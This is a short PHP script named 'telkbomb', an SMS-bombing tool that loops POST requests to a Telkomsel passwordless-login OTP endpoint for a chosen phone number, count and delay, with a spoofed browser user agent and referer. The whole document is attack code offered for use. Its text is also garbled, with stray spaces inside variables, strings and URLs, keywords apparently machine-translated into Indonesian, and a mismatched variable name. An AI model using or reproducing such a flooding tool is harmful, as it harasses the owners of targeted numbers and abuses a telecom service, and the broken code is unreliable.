<? php
function  telkbomb ( $ no , $ jum , $ wait ) {
    $ x  =  0 ;
    while ( $ x  <  $ jum ) {
        $ ch  =  curl_init ();
        curl_setopt ( $ ch , CURLOPT_URL , " https://tdwidm.telkomsel.com/passwordless/start " );
        curl_setopt ( $ ch , CURLOPT_POST , 1 );
        curl_setopt ( $ ch , CURLOPT_POSTFIELDS , " phone_number =% 2B " . $ no . " & koneksi = sms " );
        curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , true );
        curl_setopt ( $ ch , CURLOPT_REFERER , ' https://my.telkomsel.com/ ' );
        curl_setopt ( $ ch , CURLOPT_USERAGENT , ' Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 58.0.3029.110 Safari / 537.36 ' );
        $ server_output  =  curl_exec ( $ ch );
        curl_close ( $ ch );
        echo  $ server_output . " \ n " ;
        tidur ( $ tunggu );
        $ x ++ ;
        flush ();
    }
}
gema  " Input: " ;
echo  " Nomor? (ex: 628xxxx) \ n Input: " ;
$ nomor  =  trim ( fgets ( STDIN ));
echo  " Jumlah? \ n Input: " ;
$ jumlah  =  trim ( fgets ( STDIN ));
echo  " Jeda? 0-99999 (mis: 1) \ n Input: " ;
$ jeda  =  trim ( fgets ( STDIN ));
$ execute  = telkbomb ( $ nomor , $ jumlah , $ jeda );
print  $ execute ;
? >
